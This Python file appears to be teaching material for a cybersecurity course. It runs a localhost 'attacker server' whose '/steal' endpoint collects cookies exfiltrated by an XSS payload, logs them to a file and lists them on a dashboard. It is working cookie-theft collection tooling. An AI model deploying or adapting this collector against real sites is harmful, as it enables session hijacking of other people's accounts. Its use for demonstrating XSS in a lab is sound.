"""
attacker_server.py — An attacker that collects cookies stolen with XSS attack.
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote
from datetime import datetime
import os

PORT = 9000
STOLEN_FILE = "stolen_cookies.txt"
IMAGE_FILE  = "cookie_monster.png"


def load_stolen():
    """Reloads the list of cookies that were stolen"""
    if not os.path.exists(STOLEN_FILE):
        open(STOLEN_FILE, "w").close()
        return []
    with open(STOLEN_FILE, "r", encoding="utf-8") as f:
        lines = f.read().splitlines()
    return [line for line in lines if line.strip()]


def save_cookie(value):
    """Saves cookies that were stolen with timestamps"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(STOLEN_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {value}\n")


def build_main_page(cookies):
    """HTML page of the attacker"""
    rows = ""
    if cookies:
        for c in cookies:
            rows += f"<li><code>{c}</code></li>\n"
    else:
        rows = "<li>No cookies yet — send a payload from the blog.</li>"

    # If there's a picture, it saves it. Otherwise it shows a message.
    image_html = ""
    if os.path.exists(IMAGE_FILE):
        image_html = '<img src="/cookie_monster.png" alt="Cookie Monster" style="width:200px; margin-top:20px;">'
    else:
        image_html = '<p style="color:#888;">[cookie_monster.png not found — you can add it manually to the folder]</p>'

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Attacker Server</title>
  <style>
    body {{ font-family: Arial, sans-serif; max-width: 700px; margin: 40px auto; padding: 0 20px; }}
    h1   {{ color: #8e44ad; }}
    ul   {{ background: #1e1e1e; color: #00ff99; padding: 16px 32px; border-radius: 6px; }}
    code {{ font-size: 1em; }}
    .info {{ background: #f0e6ff; border: 1px solid #8e44ad; padding: 10px; border-radius: 4px; margin-bottom: 16px; font-size: 0.9em; }}
  </style>
</head>
<body>
  <h1>🍪 Attacker Server</h1>
  <div class="info">This server simulates an attacker collecting cookies stolen from the vulnerable blog.</div>

  <h2>Stolen Cookies</h2>
  <ul>
    {rows}
  </ul>

  {image_html}

  <hr>
  <small>Demonstration project — Cybersecurity Course | localhost only</small>
</body>
</html>"""


class AttackerHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == "/":
            # Main page — displays collected cookies
            cookies = load_stolen()
            page = build_main_page(cookies)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))

        elif parsed.path == "/steal":
            # Cookie stealing endpoint
            params = parse_qs(parsed.query)
            raw = params.get("cookie", [""])[0]
            cookie_value = unquote(raw)  # URL-decode

            if cookie_value:
                save_cookie(cookie_value)
                print(f"[Attacker] *** COOKIE STOLEN: {cookie_value}")
                response = f"""<!DOCTYPE html>
<html><body>
<p>Cookie received: <code>{cookie_value}</code></p>
</body></html>"""
            else:
                response = "<html><body><p>No cookie received.</p></body></html>"

            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            # Allows the browser to receive the response even from cross-origin Image() calls
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(response.encode("utf-8"))

        elif parsed.path == "/cookie_monster.png":
            # Serving Cookie Monster image
            if os.path.exists(IMAGE_FILE):
                with open(IMAGE_FILE, "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "image/png")
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"Image not found")

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def log_message(self, format, *args):
        print(f"[Attacker] {self.address_string()} — {format % args}")


if __name__ == "__main__":
    # Create cookies file if it doesn't exist
    if not os.path.exists(STOLEN_FILE):
        open(STOLEN_FILE, "w").close()

    server = HTTPServer(("localhost", PORT), AttackerHandler)
    print("=" * 50)
    print("  🍪  Attacker Server (educational only)")
    print(f"  Running at: http://localhost:{PORT}")
    print(f"  Stolen cookies saved to: {STOLEN_FILE}")
    print("  Press Ctrl+C to stop.")
    print("=" * 50)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[Attacker] Server stopped.")
